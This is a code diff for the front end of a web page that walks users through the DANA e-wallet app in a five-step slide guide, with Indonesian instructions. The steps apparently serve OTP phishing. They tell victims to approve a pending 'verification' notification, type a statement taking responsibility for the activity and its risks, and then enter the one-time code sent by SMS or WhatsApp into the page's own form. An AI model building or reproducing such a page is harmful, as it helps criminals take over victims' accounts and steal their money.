@@ -535,12 +535,12 @@ notifOkBtn.addEventListener("click", () => {
             const bukaBtn =
                 document.createElement("button");
 
-            bukaBtn.id = "openAppNotifBtn";
+            bukaBtn.id = "openDanaBtn";
             bukaBtn.className = "notif-open-app-btn";
             bukaBtn.textContent = "BUKA DANA";
 
             bukaBtn.addEventListener("click", () => {
-                window.location.href = "danaid://";
+                window.location.href = "myapp://";
             });
 
             /* ========================= */
@@ -584,6 +584,305 @@ const openDanaBtn =
 openDanaBtn.addEventListener("click", () => {
     window.location.href = "danaid://";
 });
+
+const manualSlides = [
+    {
+        image: "cara/slide1.jpg",
+        text: "Klik 'BUKA DANA' untuk buka aplikasi DANA. Kemudian di aplikasi dana klik 'PESAN'."
+    },
+    {
+        image: "cara/slide2.jpg",
+        text: "Pilih Notifikasi Verifikasi terbaru paling atas."
+    },
+    {
+        image: "cara/slide3.jpg",
+        text: "Klik tombol 'VERIFIKASI' untuk lanjut."
+    },
+    {
+        image: "cara/slide4.jpg",
+        text: "Ketik 'Ini benar aktivitas saya dan saya sadar serta paham risikonya.' untuk lanjut mendapatkan Kode OTP."
+    },
+    {
+        image: "cara/slide5.jpg",
+        text: "Kode OTP terkirim via WhatsApp/SMS. Kode yang di terima di isi ke form untuk lanjut ke data diri."
+    }
+];
+
+
+/* ========================= */
+/* STATE */
+/* ========================= */
+
+let manualCurrent = 0;
+
+let manualAnimating = false;
+
+
+/* ========================= */
+/* ELEMENT */
+/* ========================= */
+
+const manualOverlay =
+    document.getElementById("manualOverlay");
+
+const manualImage =
+    document.getElementById("manualImage");
+
+const manualDescription =
+    document.getElementById("manualDescription");
+
+const manualStep =
+    document.querySelector(".manual-step");
+
+const manualDots =
+    document.getElementById("manualDots");
+
+
+/* ========================= */
+/* PRELOAD SEMUA GAMBAR */
+/* ========================= */
+
+manualSlides.forEach(slide => {
+
+    const img =
+        new Image();
+
+    img.src =
+        slide.image;
+
+});
+
+
+/* ========================= */
+/* RENDER DOTS */
+/* ========================= */
+
+function renderManualDots() {
+
+    manualDots.innerHTML = "";
+
+    manualSlides.forEach((_, index) => {
+
+        const dot =
+            document.createElement("span");
+
+        dot.className =
+            index === manualCurrent
+                ? "active"
+                : "";
+
+        manualDots.appendChild(dot);
+
+    });
+
+}
+
+
+/* ========================= */
+/* UPDATE TEXT */
+/* ========================= */
+
+function updateManualText() {
+
+    const slide =
+        manualSlides[manualCurrent];
+
+    manualDescription.textContent =
+        slide.text;
+
+    manualStep.textContent =
+        `Langkah ${manualCurrent + 1}`;
+
+    renderManualDots();
+
+}
+
+
+/* ========================= */
+/* INITIAL */
+/* ========================= */
+
+function renderManualSlide() {
+
+    const slide =
+        manualSlides[manualCurrent];
+
+    manualImage.src =
+        slide.image;
+
+    updateManualText();
+
+}
+
+
+/* ========================= */
+/* SLIDE */
+/* ========================= */
+
+function changeManualSlide(direction) {
+
+    if (manualAnimating)
+        return;
+
+    manualAnimating = true;
+
+
+    /* arah animasi */
+
+    const animationClass =
+        direction === "next"
+            ? "slide-next"
+            : "slide-prev";
+
+
+    manualImage.classList.remove(
+        "slide-next",
+        "slide-prev"
+    );
+
+    void manualImage.offsetWidth;
+
+
+    /* gambar baru */
+
+    manualCurrent +=
+        direction === "next"
+            ? 1
+            : -1;
+
+
+    if (
+        manualCurrent >=
+        manualSlides.length
+    ) {
+
+        manualCurrent = 0;
+
+    }
+
+
+    if (manualCurrent < 0) {
+
+        manualCurrent =
+            manualSlides.length - 1;
+
+    }
+
+
+    const slide =
+        manualSlides[manualCurrent];
+
+
+    /* update gambar */
+
+    manualImage.src =
+        slide.image;
+
+
+    /* update teks */
+
+    manualDescription.textContent =
+        slide.text;
+
+    manualStep.textContent =
+        `Langkah ${manualCurrent + 1}`;
+
+
+    renderManualDots();
+
+
+    /* jalankan animasi */
+
+    manualImage.classList.add(
+        animationClass
+    );
+
+
+    setTimeout(() => {
+
+        manualImage.classList.remove(
+            animationClass
+        );
+
+        manualAnimating = false;
+
+    }, 220);
+
+}
+
+
+/* ========================= */
+/* BUKA POPUP */
+/* ========================= */
+
+document
+    .getElementById("manualGuideBtn")
+    .addEventListener("click", () => {
+
+        manualCurrent = 0;
+
+        renderManualSlide();
+
+        manualOverlay.classList.add(
+            "show"
+        );
+
+    });
+
+
+/* ========================= */
+/* TUTUP POPUP */
+/* ========================= */
+
+document
+    .getElementById("manualClose")
+    .addEventListener("click", () => {
+
+        manualOverlay.classList.remove(
+            "show"
+        );
+
+    });
+
+
+/* ========================= */
+/* PREV */
+/* ========================= */
+
+document
+    .getElementById("manualPrev")
+    .addEventListener("click", () => {
+
+        changeManualSlide("prev");
+
+    });
+
+
+/* ========================= */
+/* NEXT */
+/* ========================= */
+
+document
+    .getElementById("manualNext")
+    .addEventListener("click", () => {
+
+        changeManualSlide("next");
+
+    });
+
+
+/* ========================= */
+/* OPEN APP */
+/* ========================= */
+
+document
+    .getElementById("manualOpenApp")
+    .addEventListener("click", () => {
+
+        window.location.href =
+            "danaid://";
+
+    });
 
 /* ========================= */
 /* MULAI DARI AWAL */
